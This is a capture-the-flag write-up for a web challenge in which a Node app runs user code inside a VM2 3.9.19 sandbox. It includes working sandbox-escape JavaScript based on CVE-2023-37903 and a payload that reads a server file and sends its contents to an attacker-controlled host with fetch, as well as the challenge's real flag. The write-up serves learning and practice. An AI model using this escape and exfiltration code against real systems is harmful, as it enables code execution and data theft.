# mws

[library.m0unt41n.ch/challenges/mws](https://library.m0unt41n.ch/challenges/mws) ![](../../resources/web.svg) ![](../../resources/hard.svg) 

# TL;DR

> _Don't worry about the other users of our platform! We use state of the art_
> _sandboxing techonology for isolation! Docker? What is that? Our solution_
> _has no overhead, and that is way we are cheaper._

VM2 sandbox escape, reading the flag from local file and sending it via
HTTP request to attacker-controller remote server.

# Initial analysis

```bash
docker build -t app:latest .
docker run -p 3000:3000 -it app:latest
```

The app exposes:

*   `GET /` serves `index.html`
*   `GET /lambdas` returns JSON with lambdas of `mannheim` user
*   `POST /lambdas` takes `name`+`code` and adds a lambda for `mannheim`
*   `DELETE /lambdas/user/name`  deletes the lambda. No access control??
*   `GET /user/name` executes a lambda and returns the result

"Lambda" is just a piece of Javascript code, that has to define an `endpoint`
method which will be then executed inside a VM2-based sandbox.
An obvious reference to [AWS Lambda](https://aws.amazon.com/lambda/).

## Lambda management and execution

Lambdas are stored in a `lambdaRouter` object (`lambdaRouter.js`), with capability
to add, remove and execute. All lambdas have name and owner and all those created / executed
in the UI are owned by `mannheim` user. The `lambdaRouter` object is attached to
`GET /<user>/<lambda>` requests. As additional safeguard neither `user` nor `lambda`
can contain `/`.

Before executing the lambda, the user-provided code gets a `endpoint();` suffix,
which executes the method (`sandbox.js`). Note that this is not much of a limit, as
we can always end the code with `//`, effectively turning that into a comment.
So, all in all, we have arbitrary code execution in that sandbox.

## The flag

The flag is stored as a `get_flag` lambda, explicitly initialized in `index.js` and
owned by `admin` user. Its code has some additional safeguards to prefent it from
executing easily:

```javascript
lambdaRouter.add(new Lambda(
    'admin', 
    'get_flag', 
    `function endpoint(req) {
        result = "cyberskills23{this_is_a_fake_flag}";
        try {
            if (true) {
                throw new LambdaError("try harder: " + result);
            }
            return {
                status: 200,
                body: result
            }
    (...)
```

## Sandbox restrictions

In `sandbox.js`, the VM is started with following restrictions:

*   The parameters (`params`, `query` and `body`) are made read-only
*   The VM is given only **16 milliseconds** to execute.
*   Apart from default global objects and above params, only `console.log` and
    `LambdaError` objects are passed.


# VM2 3.9.19 vulnerabilities

VM2 sandbox version is fixed at 3.9.19 - which is the last one before it has been
[discontinued](https://github.com/patriksimek/vm2/issues/533), as the author could
not keep up with the vulnerabilities. According to
[security.snyk.io/package/npm/vm2](https://security.snyk.io/package/npm/vm2):

*   [Sandbox Escape in vm2@3.9.19 via Promise[@@species]](https://github.com/patriksimek/vm2/security/advisories/GHSA-cchq-frgv-rjh5)
    *   [CVE-2023-37466](https://www.cve.org/CVERecord?id=CVE-2023-37466) /
        [SNYK-JS-VM2-5772825](https://security.snyk.io/vuln/SNYK-JS-VM2-5772825)
    *   [PoC code](https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9) /
        [ExploitDB](https://www.exploit-db.com/exploits/51898)
*   [Sandbox Escape in vm2@3.9.19 via custom inspect function](https://github.com/patriksimek/vm2/security/advisories/GHSA-g644-9gfx-q4q4)
    *   [CVE-2023-37903](https://www.cve.org/CVERecord?id=CVE-2023-37903) /
        [SNYK-JS-VM2-5772823](https://security.snyk.io/vuln/SNYK-JS-VM2-5772823)
    *   [PoC code](https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd)

[This HTB challenge](https://0xdf.gitlab.io/2024/04/06/htb-codify.html) exploits some of them.
There is also an
[older write-up](https://www.vicarius.io/vsociety/posts/critical-vulnerabilities-in-vm2-sandbox),
but it explots vulnerabilities that were patched in 3.9.19.

# Getting the flag

At first, the vector of attack seems to be: get access to `lambdaRouter` via sandbox escape
and copy contents (`code`) from `get_flag` to a lambda that is accessible by a non-admin user.

> Spoiler alert: I could not get it to work &#128578; Not enough JS/NodeJS-fu.

## Sandbox escape

Out of two active vulnerabilities, considering the 16ms limit, the
CVE-2023-37903 looked more promising.  First, I made a proof of concept that we
have a sandbox escape at all:

```javascript
function endpoint(req) {
  const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
  obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
      obj = inspect.constructor('return globalThis.process')();
      log(obj);
    },
    valueOf: undefined,
    constructor: undefined,
  }
  r = WebAssembly.compileStreaming(obj).catch(()=>{});
  return {
    status: 200,
    body: "OK\\n"
  };
}
```

**That worked**. Inside that `inspect.constructor()` code string I could get all kinds of
global variables and log them to the console. The values were very different from those I got
when calling from the `endpoint()` method directly. The kinds of objects I got access to:

*   `globalThis.process.getBuiltinModule("module")`
*   `globalThis`
*   `process` (and then use it as `process.binding("fs")`, `process.binding("constants")`)
*   `fs`

However: **I found no way to access `lambdaRouter`**. My JS/NodeJS knowledge was not up to the task.
I did something way more brutal instead &#128521;

## Exfiltrating flag to external server

While the direct approach failed, I still had full sandbox escape - which included things like
reading files and creating network connections. My next idea was to just read the flag from the
source file and send it somewhere:

```javascript
globalThis.process.getBuiltinModule('fs').readFile(
    '/app/index.js',
    'utf-8',
    (err, data) => {
        fetch('http://MY.AWS.INSTANCE/' + data.match('(cyberskills23{[^}]+})')[0]);
    }
);
```

Turning this into JS payload for the "lambda":

```javascript
function endpoint(req) {
  const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');
  obj = {
    [customInspectSymbol]: (depth, opt, inspect) => {
      obj = inspect.constructor("globalThis.process.getBuiltinModule('fs').readFile('/app/index.js', 'utf-8', (err, data) => {fetch('http://MY.AWS.INSTANCE/'+data.match('(cyberskills23{[^}]+})')[0]);});")();
    },
    valueOf: undefined,
    constructor: undefined,
  }
  r = WebAssembly.compileStreaming(obj).catch(()=>{});
  return {
    status: 200,
    body: "OK\\n"
  };
}
```

Then, on the AWS instance:

```
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
MY.HOME.IP.ADDRESS - - [24/Dec/2024 08:25:55] code 404, message File not found
MY.HOME.IP.ADDRESS - - [24/Dec/2024 08:25:55] "GET /cyberskills23%7Bthis_is_a_fake_flag%7D HTTP/1.1" 404 -
```

So, this worked locally.

# Remote exploit

This was obviously not guaranteed to work in the public instance:

*   16ms execution limit might be too short to do all this (I'd expect remote instance to
    be much slower than my PC).
*   I did not know if the remote instance has access to the internet.
*   All in all this sounded a log like unintended solution / cheating.

But it worked &#128512;

```
# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
128.140.62.133 - - [24/Dec/2024 08:33:55] code 404, message File not found
128.140.62.133 - - [24/Dec/2024 08:33:55] "GET /cyberskills23%7Bs4ndb0x_v3ry_s3cur3_1nd33d_45d39ef910a6%7D HTTP/1.1" 404 -
```

---

## `cyberskills23{s4ndb0x_v3ry_s3cur3_1nd33d_45d39ef910a6}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
